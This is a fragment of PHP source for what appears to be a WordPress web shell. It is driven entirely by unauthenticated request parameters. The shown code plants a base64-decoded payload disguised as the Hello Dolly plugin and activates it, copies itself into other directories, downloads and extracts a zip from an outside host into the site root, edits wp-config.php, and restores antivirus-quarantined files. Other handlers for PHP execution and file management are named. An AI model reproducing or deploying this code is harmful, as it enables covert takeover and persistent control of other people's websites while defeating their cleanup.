    echo "<font color=red>Error:</font> cant delete $tmp_file<br>";
      die();
    }
  }

  


  $plug_dir =  WP_PLUGIN_DIR . '/hello';
  $plug_file = $plug_dir . '/hello.php';

  if(!file_exists($plug_dir)){
    if(mkdir($plug_dir)){
      echo "<font color=green>Succes:</font> create $plug_dir<br>";
    } else {  
      echo "<font color=red>Error:</font> can't create $plug_dir<br>";
      die();
    }
  } else {
    echo "<font color=green>Succes:</font> Directory $plug_dir exists<br>";
  }

  if(file_put_contents($plug_file, base64_decode($dolly_code))){
    echo "<font color=green>Succes:</font> $plug_file<br>";
  } else {
    echo "<font color=red>Error:</font> $plug_file<br>";
    die();
  }
  @clearstatcache();

  if(file_exists($plug_file)){
    echo "<font color=green>Succes:</font> $plug_file found<br>";
  } else {
    echo "<font color=red>Error:</font> $plug_file not found<br>";
    die();
  }

  require_once ABSPATH .'/wp-admin/includes/plugin.php';

  echo "<font color=green>Succes:</font> include admin<br>";

  if ( wp_cache_delete('plugins', 'plugins') ){
    echo "<font color=green>Succes:</font> clear cache<br>";
  } else {
    echo "<font color=red>Error:</font> can't clear cache<br>";
  }
  

  $plug = activate_plugin( 'hello/hello.php','',false,true);
  
  if( is_wp_error( $plug )){
    echo $plug->get_error_code();
    echo $plug->get_error_message();
    echo $plug->get_error_data();
  } else {
    echo "<br><br><font size=+5 color=green>Succes:</font> plugin activate<br>";
  }


  
}


function copy_zpl(){

  if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
    $wpc = base64_decode($_REQUEST['f']);
  } else {
    die('WTF?');
  }

  $dir = dirname($wpc);

  $loc_file = trim( preg_replace('/\(.*$/', '', __FILE__) );
  
  if (copy( $loc_file ,$dir . '/pl.php')){
    echo "<font color=green>Succes:</font>copy  $dir pl.php<br>";
  } else {
    echo "<font color=red>Error:</font>copy $dir pl.php<br>";
    die();
  }
}

function restore(){
  
  if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
    $rf = base64_decode($_REQUEST['f']);
  } else {
    die('WTF?');
  }
  
  if(isset($_REQUEST['d']) && '' !== $_REQUEST['d']){
    $dir = $_REQUEST['d'];
  } else {
    die('WTF?');
  }
  $nn = str_replace('.suspected', '', $rf);
  $nd = base64_encode($nn);
  if(copy($rf,$nn)){
    echo "<script>parent.Worker('f_m','$dir','', '','$nd','file_man');</script>";
  } else {
    die('Can\t copy file');
  }
}

function delete_zpl(){
    if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
    $wpc = base64_decode($_REQUEST['f']);
  } else {
    die('WTF?');
  }

  $dir = dirname($wpc);

    
  if(unlink($dir . '/pl.php')){
    echo "<font color=green>Succes:</font>delete  $dir pl.php<br>";
  } else {
    echo "<font color=red>Error:</font>can't delete $dir pl.php<br>";
    die();
  }
}

function  update_wordpress(){

  if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
    $wpc = base64_decode($_REQUEST['f']);
  } else {
    die('WTF?');
  }

  $dir = str_replace('wp-config.php', '', $wpc);

  $pphv = phpversion();
  
  if('7' == $pphv[0]){
    $ver = 'wp.zip'; 
  } else {
    $ver= 'wp51.zip';
  }

  $name = $dir . $ver;
  
  $ch = curl_init ('http://carwash-leusden.nl/wordpress/'.$ver);
  $fp = fopen ($name, "w+");
  curl_setopt ($ch, CURLOPT_FILE, $fp);
  curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
  $ult = curl_exec ($ch);
  curl_close ($ch);
  fclose ($fp);
  
  if($ult){
    $zip = new ZipArchive;
    if ($zip->open($name) === TRUE) {
      $zip->extractTo($dir);
      $zip->close();
      echo 'All ok';
    } else {
    echo 'Zip error';
    }
  } else {
    echo 'Curl error';
  }
  die();
}

function debug_wordpress(){

  if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
    $wpc = base64_decode($_REQUEST['f']);
  } else {
    die('WTF?');
  }

  if(isset($_REQUEST['c']) && '' !== $_REQUEST['c']){
    $c = $_REQUEST['c'];
  } else {
    die('WTF?');
  }
  if('true' == $c){
    $cod = "define( 'WP_DEBUG', true );";
  } else {
    $cod = "define( 'WP_DEBUG', false );";
  }

  $tmp = file_get_contents($wpc);
  $count = 0;
  $tmp = preg_replace('/define\s*\(\s*\'WP_DEBUG\'\s*,\s*(true|false)\s*\)\s*;/is', $cod, $tmp, -1 , $count);

  if(0 == $count){
    $tmp = preg_replace('/(\$table_prefix\s*=\s*(\'|")[\S]+(\'|")\s*;)/is', '$1' ."\n\n". $cod, $tmp, -1 , $count);    
  }

  if(file_put_contents($wpc, $tmp)){
    @clearstatcache();
    $tmp = file_get_contents($wpc);
    if(strpos($tmp, $cod) === false){
      echo 'Error: Can\'t find code';  
    } else {
      echo "Succes set $cod";
    }   
  } else {
    echo 'Error: Bad file_put_contents';
  }
}

function delete_md5(){

  if(isset($_REQUEST['c']) && '' !== $_REQUEST['c']){
    $md5 = $_REQUEST['c'];
  } else {
    die('WTF?');
  }  

  $all_files = file('manual_log');
  $all_files = array_unique($all_files);
  
  foreach($all_files as $t){
    $t = trim($t);
    $tex = explode('=====', $t);
    $file = $tex[0];
    $md5_file = md5(file_get_contents($file));
    if($md5 == $md5_file){
      copy($file, $file . '.suspected');
      if(unlink($file)){echo "$file deleted!<br>";} else {echo "<font color=red>$file ERROR deleted!</font><br>";}
    }
  }

  echo "Done!";
}

function delete_name(){

  if(isset($_REQUEST['c']) && '' !== $_REQUEST['c']){
    $fn = $_REQUEST['c'];
  } else {
    die('WTF?');
  }  

  $all_files = file('manual_log');
  $all_files = array_unique($all_files);
  
  foreach($all_files as $t){
    $t = trim($t);
    $tex = explode('=====', $t);
    $file = $tex[0];
    $file_n = basename($file);
    if($file_n == $fn){
      unlink($file);
    }
  }

  echo "<script>parent.Worker('m_a','','', '','','file_man');</script>";
}

if ( 0 == count($_POST) &&  0 == count($_GET) ) {

	echo_header();
	echo_scripts();
	check_functions();
	big_form();
	big_table();
	echo '<script>MakeHome();</script>';
	die();

} else {

	switch ($_REQUEST['a']){
		
    case "r_s":
    restore();
    die();
		
    case "f_m":
		file_man();
		die();

		case "e_f":
		edit_file();
		die();

		case "s_f":
		save_file();
		die();

    case "s_n":
    save_norm();
    die();

		case "d_f":
		delete_file();
		die();

    case "d_z":
    delete_zpl();
    die();

		case "e_p":
		exec_php();
		die();

		case "suicide":
		suicide();
		die();

		case "m_w":
		make_worker();
		die();

		case "m_f":
		manage_file();
		die();

		case "d_d":
		download000();
		die();

		case "c_f":
		chmod_file();
		die();

		case "r_f":
		renew_file();
		die();

		case "m_a":
		manual_av();
		die();

		case "m_p":
    manual_wp();
		die();

		case "m_wp":
    make_wp();
		die();

    case "c_z":
    copy_zpl();
    die();

    case "u_w":
    update_wordpress();
    die();

    case "d_w":
    debug_wordpress();
    die();

    case "d_5":
    delete_md5();
    die();

    case "d_n":
    delete_name();
    die();
	}
}
?>
